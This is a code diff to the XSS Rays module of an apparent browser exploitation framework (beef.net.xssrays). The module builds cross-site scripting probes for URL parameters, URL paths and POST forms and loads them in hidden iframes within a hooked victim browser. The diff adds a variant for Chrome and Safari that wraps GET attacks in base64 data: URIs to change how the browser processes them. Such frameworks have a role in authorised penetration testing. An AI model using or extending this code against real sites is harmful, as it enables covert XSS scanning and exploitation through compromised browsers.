@@ -308,7 +308,10 @@ beef.net.xssrays = {
             var ray = this.rays[beef.net.xssrays.uniqueID];
 
             var paramsPos = 0;
-            if (params != null) { // check for XSS in GET parameters
+            if (params != null) {
+                /*
+                 * ++++++++++ check for XSS in URI parameters (GET) ++++++++++
+                 */
                 for (var i in params) {
                     if (params.hasOwnProperty(i)) {
 
@@ -328,12 +331,19 @@ beef.net.xssrays = {
 
                         exploit = vector.input.replace(/XSS/g, beefCallback);
 
-                        url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+                        if(beef.browser.isC() || beef.browser.isS()){ //we will base64 the whole uri later
+                            url += i + '=' + exploit + '&';
+                        }else{
+                            url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+                        }
 
                         paramsPos++;
                     }
                 }
-            } else {  // check for XSS in GET URL path
+            } else {
+                /*
+                 * ++++++++++ check for XSS in URI path (GET) ++++++++++
+                 */
                 var filename = beef.net.xssrays.fileName(url);
 
                 poc = vector.input.replace(/XSS/g, "alert(1)");
@@ -352,8 +362,9 @@ beef.net.xssrays = {
                 //TODO: this need to checked and the slash shouldn't be added in this particular case
                 url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
             }
-
-
+            /*
+             * ++++++++++ create the iFrame that will contain the attack vector ++++++++++
+             */
             var iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.id = 'ray' + beef.net.xssrays.uniqueID;
@@ -361,10 +372,18 @@ beef.net.xssrays = {
             iframe.name = 'ray' + Math.random().toString();
 
             if (method === 'GET') {
-                iframe.src = url;
+                if(beef.browser.isC() || beef.browser.isS()){
+                    var datauri = btoa(url);
+                    iframe.src = "data:text/html;base64," + datauri;
+                }else{
+                    iframe.src = url;
+                }
                 document.body.appendChild(iframe);
                 beef.net.xssrays.printDebug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
             } else if (method === 'POST') {
+                /*
+                 * ++++++++++ check for XSS in body parameters (POST) ++++++++++
+                 */
                 var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
                 poc = '';
                 pocurl = action + "?";
